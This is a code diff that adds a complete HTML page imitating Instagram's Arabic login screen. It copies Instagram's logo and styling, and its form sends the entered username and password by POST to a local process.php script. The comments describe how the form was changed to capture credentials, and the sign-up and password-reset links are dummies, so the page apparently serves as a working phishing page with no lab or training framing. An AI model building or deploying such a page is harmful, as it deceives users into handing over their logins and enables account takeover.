@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول • إنستغرام</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --ig-blue: #0095f6;
+      --ig-border: #dbdbdb;
+      --ig-error: #ed4956;
+      --ig-text: #262626;
+      --ig-grey: #8e8e8e;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+    body {
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      border: 1px solid var(--ig-border);
+      padding: 40px 30px 20px;
+      text-align: center;
+      width: 100%;
+      max-width: 350px;
+      border-radius: 10px;
+    }
+    .logo {
+      background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png') no-repeat center;
+      background-size: contain;
+      height: 60px;
+      margin: 0 auto 30px;
+      width: 180px;
+    }
+    .input-group {
+      margin-bottom: 6px;
+      position: relative;
+    }
+    input {
+      width: 100%;
+      padding: 12px 36px 12px 12px;
+      background: #fafafa;
+      border: 1px solid var(--ig-border);
+      border-radius: 8px;
+      font-size: 12px;
+      height: 44px;
+      direction: ltr;
+      transition: all 0.2s ease;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--ig-grey);
+      box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.1);
+    }
+    button.login-btn {
+      width: 100%;
+      background: var(--ig-blue);
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 8px;
+      font-weight: 600;
+      margin: 16px 0;
+      height: 44px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      opacity: 0.7;
+      pointer-events: none;
+    }
+    button.login-btn.active {
+      opacity: 1;
+      pointer-events: auto;
+      background: linear-gradient(45deg, #ff0066, #ff00cc, #0095f6);
+    }
+    .separator {
+      display: flex;
+      align-items: center;
+      color: var(--ig-grey);
+      margin: 18px 0;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .line {
+      flex: 1;
+      height: 1px;
+      background: var(--ig-border);
+    }
+    .or {
+      margin: 0 18px;
+    }
+    .links a {
+      color: var(--ig-blue);
+      font-size: 12px;
+      text-decoration: none;
+      margin: 10px 0;
+      display: block;
+    }
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: var(--ig-grey);
+      font-size: 12px;
+      background: none;
+      border: none;
+      padding: 0;
+      font-weight: 600;
+    }
+    .error-msg {
+      color: var(--ig-error);
+      font-size: 12px;
+      margin: 8px 0;
+      display: none;
+    }
+    .loading {
+      display: none;
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--ig-blue);
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 2s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo"></div>
+    <!-- تعديل الفورم ليقوم بإرسال البيانات إلى process.php باستخدام طريقة POST -->
+    <form id="loginForm" action="process.php" method="POST">
+      <div class="input-group">
+        <!-- إضافة السمة name لإرسال البيانات -->
+        <input type="text" id="username" name="username" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+        <button type="button" class="password-toggle" onclick="togglePassword()">إظهار</button>
+      </div>
+      <div class="error-msg" id="errorMsg">يرجى إدخال بيانات صحيحة قبل المتابعة!</div>
+      <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+      <div class="loading" id="loading"></div>
+      <div class="separator">
+        <div class="line"></div>
+        <span class="or">أو</span>
+        <div class="line"></div>
+      </div>
+      <div class="links">
+        <a href="https://www.facebook.com" target="_blank"><i class="fab fa-facebook-square"></i> تسجيل الدخول باستخدام فيسبوك</a>
+        <a href="#">نسيت كلمة المرور؟</a>
+      </div>
+    </form>
+    <div class="signup-section">
+      <p>ليس لديك حساب؟ <a href="#" id="signUpLink" style="color: var(--ig-blue); font-weight: 600">سجل الآن</a></p>
+    </div>
+  </div>
+
+  <script>
+    const username = document.getElementById('username');
+    const password = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorMsg = document.getElementById('errorMsg');
+    const loading = document.getElementById('loading');
+    const signUpLink = document.getElementById('signUpLink');
+
+    const isValid = {
+      username: false,
+      password: false
+    };
+
+    function validateUsername(value) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const userRegex = /^[a-zA-Z0-9._]{5,30}$/;
+      return emailRegex.test(value) || userRegex.test(value);
+    }
+
+    function validatePassword(value) {
+      return value.length >= 8;
+    }
+
+    function updateButtonState() {
+      if (isValid.username && isValid.password) {
+        loginBtn.classList.add('active');
+      } else {
+        loginBtn.classList.remove('active');
+      }
+    }
+
+    function togglePassword() {
+      const toggleBtn = document.querySelector('.password-toggle');
+      if (password.type === 'password') {
+        password.type = 'text';
+        toggleBtn.textContent = 'إخفاء';
+      } else {
+        password.type = 'password';
+        toggleBtn.textContent = 'إظهار';
+      }
+    }
+
+    username.addEventListener('input', (e) => {
+      isValid.username = validateUsername(e.target.value);
+      updateButtonState();
+    });
+
+    password.addEventListener('input', (e) => {
+      isValid.password = validatePassword(e.target.value);
+      updateButtonState();
+    });
+
+    // عند تقديم النموذج، نتحقق من صحة البيانات ثم نظهر مؤشر التحميل وبعد تأخير بسيط نقوم بإرسال البيانات إلى صفحة process.php
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      if (!isValid.username || !isValid.password) {
+        e.preventDefault();
+        errorMsg.style.display = 'block';
+      } else {
+        errorMsg.style.display = 'none';
+        loading.style.display = 'block';
+        e.preventDefault();
+        // تأخير قصير لإظهار التحميل قبل إرسال النموذج
+        setTimeout(() => {
+          e.target.submit();
+        }, 1000);
+      }
+    });
+
+    // عند الضغط على "سجل الآن" إظهار رسالة الخطأ وعدم التوجيه
+    signUpLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      alert("لا يمكنك إنشاء حساب جديد حالياً");
+    });
+  </script>
+</body>
+</html>
